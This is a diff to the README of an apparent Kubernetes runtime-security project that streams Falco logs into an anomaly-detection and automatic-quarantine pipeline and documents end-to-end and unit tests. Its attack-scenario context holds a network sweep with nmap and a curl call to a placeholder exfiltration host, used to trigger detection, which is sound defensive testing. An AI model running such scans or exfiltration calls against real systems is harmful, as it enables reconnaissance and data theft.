@@ -157,7 +157,7 @@ python response_engine/webhook_server.py --port 5000
 
 # Terminal 2: Stream live Falco logs directly into normalizer and forward to API
 kubectl logs -l app.kubernetes.io/name=falco -n aiops-security --follow | `
-  python infrastructure/telemetry/log_aggregator.py --stdin --output unified_telemetry.jsonl
+  python infrastructure/telemetry/log_aggregator.py --stdin --forward-url http://localhost:5000/api/v1/event --output unified_telemetry.jsonl
 ```
 
 ### 5. Trigger Real Container Attack Scenarios
@@ -183,20 +183,39 @@ nmap -sP 10.244.0.0/24
 curl http://203.0.113.10:9999/exfil
 ```
 
-Falco detects the anomalous syscall patterns → stream is normalized → Autoencoder detects the anomaly → NetworkPolicy quarantine is applied to `$POD`.
+Falco detects the anomalous syscall patterns → stream is normalized → Autoencoder / Heuristic pipeline scores the anomaly → MITRE techniques mapped → NetworkPolicy quarantine is applied to `$POD`.
 
 ---
 
-## Verification & Testing
+## Automated End-to-End Pipeline Testing
 
-To run the complete automated test suite:
+To run the complete automated end-to-end integration test (testing live telemetry ingestion, ML scoring, MITRE ATT&CK mapping, automated remediation, and dataset persistence):
+
+```powershell
+# 1. Ensure webhook server is running (Terminal 1)
+python response_engine/webhook_server.py --port 5000 --model-dir models/autoencoder
+
+# 2. Execute E2E Integration Suite (Terminal 2)
+python scripts/test_e2e_pipeline.py --url http://localhost:5000
+```
+
+### Telemetry Storage & Audit Trails
+Processed runtime events and automated response alerts are persistently stored at:
+- **`datasets/falco/processed/runtime_detections.jsonl`**: All processed telemetry events with ML scoring and detection metadata.
+- **`datasets/falco/processed/runtime_alerts.jsonl`**: High & Critical severity alerts that triggered automated containment actions.
+
+---
+
+## Unit & Component Tests
+
+To run the comprehensive test suite across all modules:
 
 ```powershell
 pytest tests/ -v
 ```
 
-All unit and integration tests validate:
-- Preprocessing & feature extraction
+All 27 test cases validate:
+- Preprocessing, schema validation & feature extraction
 - Autoencoder forward pass, reconstruction MSE, and thresholding
-- Deterministic MITRE ATT&CK mapping
-- Webhook REST API endpoints & NetworkPolicy generation logic
+- Deterministic MITRE ATT&CK mapping & kill chain staging
+- Webhook REST API endpoints, `/api/v1/event` ML inference, and NetworkPolicy generation logic
